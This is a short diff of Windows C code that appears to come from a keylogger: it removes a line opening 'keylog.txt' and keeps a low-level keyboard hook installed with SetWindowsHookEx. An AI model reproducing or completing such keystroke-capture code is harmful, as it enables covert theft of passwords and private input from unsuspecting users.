@@ -2,8 +2,6 @@
 
 int main() {
 
-    file = fopen("keylog.txt", "w");
-
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
     hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_callback, NULL, 0);
 
